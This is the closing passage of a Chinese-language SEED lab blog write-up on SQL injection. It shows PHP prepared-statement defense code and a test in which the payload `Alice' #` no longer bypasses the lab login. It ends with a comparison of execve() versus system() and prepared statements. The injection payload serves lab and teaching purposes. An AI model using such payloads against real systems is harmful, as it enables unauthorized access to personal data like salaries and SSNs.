+</span></span><span class="line"><span class="cl">  <span class="c1">// Bind parameters (s - string, i - int, d - double, b - blob)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;ss&#34;</span><span class="p">,</span> <span class="nv">$input_uname</span><span class="p">,</span> <span class="nv">$hashed_pwd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="c1">// Execute the statement
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="c1">// Get the result
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">get_result</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// only take the first row
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$firstrow</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$id</span>     <span class="o">=</span> <span class="nv">$firstrow</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span>   <span class="o">=</span> <span class="nv">$firstrow</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$eid</span>    <span class="o">=</span> <span class="nv">$firstrow</span><span class="p">[</span><span class="s2">&#34;eid&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$salary</span> <span class="o">=</span> <span class="nv">$firstrow</span><span class="p">[</span><span class="s2">&#34;salary&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ssn</span>    <span class="o">=</span> <span class="nv">$firstrow</span><span class="p">[</span><span class="s2">&#34;ssn&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="c1">// Close the statement
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// close the sql connection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><ol>
+<li><strong>使用准备好的语句（Prepared Statements）</strong>：通过 <code>$conn-&gt;prepare()</code> 函数创建查询，并使用 <code>?</code> 占位符来防止直接插入用户输入内容。</li>
+<li><strong>绑定参数</strong>：使用 <code>$stmt-&gt;bind_param()</code> 函数，将用户输入的参数绑定到准备好的语句中。这种做法确保了SQL查询不会直接拼接用户输入，从而避免SQL注入风险。其中 <code>&quot;ss&quot;</code> 表示 <code>$input_uname</code> 和 <code>$hashed_pwd</code> 都是字符串类型。</li>
+</ol>
+<h3 id="测试">测试<a hidden class="anchor" aria-hidden="true" href="#测试">#</a></h3>
+<p>访问 <u><a href="http://www.seed-server.com/defense">http://www.seed-server.com/defense</a></u> 再使用 <code>Alice' #</code> 对 USERNAME 进行 SQL 注入测试：</p>
+<img src="https://s2.loli.net/2024/10/24/fLGgDj8mlhQWrdS.png" alt="image-20241024152049318" style="zoom:60%;" />
+<p>发现已经无法查询到 Alice 的信息了。</p>
+<h2 id="思考题">思考题<a hidden class="anchor" aria-hidden="true" href="#思考题">#</a></h2>
+<blockquote>
+<p>为了防止 C 程序在调用外部程序时出现代码注入攻击，我们不应该使用 system()，而应使用 execve()。请描述这种防御措施与防御 SQL 注入攻击的预处理语句之间的相似性。</p>
+</blockquote>
+<h3 id="1-system-vs-execve-防御代码注入">1. system() vs execve() 防御代码注入<a hidden class="anchor" aria-hidden="true" href="#1-system-vs-execve-防御代码注入">#</a></h3>
+<ul>
+<li>在 C 语言中使用 <code>system()</code> 调用外部程序时，用户输入直接作为 shell 命令的一部分，如果用户输入中包含特殊字符或命令，就可能导致代码注入攻击。</li>
+<li>而 <code>execve()</code> 是更安全的选择，因为它直接调用外部程序，而不使用 shell。这意味着它不会将输入当作 shell 命令进行解析，避免了恶意输入的执行。</li>
+</ul>
+<h3 id="2-sql-预处理语句防御-sql-注入">2. SQL 预处理语句防御 SQL 注入<a hidden class="anchor" aria-hidden="true" href="#2-sql-预处理语句防御-sql-注入">#</a></h3>
+<ul>
+<li>在 SQL 查询中，如果直接将用户输入插入到查询字符串中，恶意用户可以利用输入中的特殊字符来构造有害的 SQL 语句，导致 SQL 注入攻击。</li>
+<li>使用 SQL 预处理语句可以防止这种情况发生。预处理语句将查询结构与参数分开，参数通过安全绑定方式插入，不会被当作 SQL 代码解析，避免了攻击。</li>
+</ul>
+<h3 id="两者的相似性">两者的相似性<a hidden class="anchor" aria-hidden="true" href="#两者的相似性">#</a></h3>
+<ul>
+<li>两者都采用了分离用户输入和实际代码执行的方式，从而防止了恶意代码注入。</li>
+<li><code>execve()</code> 通过直接调用程序避免了 shell 的解析，而预处理语句通过绑定参数避免了 SQL 解析。</li>
+<li>在本质上，这些防御措施都是为了避免将用户输入直接传递给解释器或执行环境，从而避免潜在的注入攻击。</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://smera1d0.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">软件安全</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E-set-uid-%E5%AE%9E%E9%AA%8C/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>SEEDlab—环境变量与 Set-UID 实验</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>© <a href="https://github.com/adityatelange/hugo-PaperMod/graphs/contributors">PaperMod Contributors</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
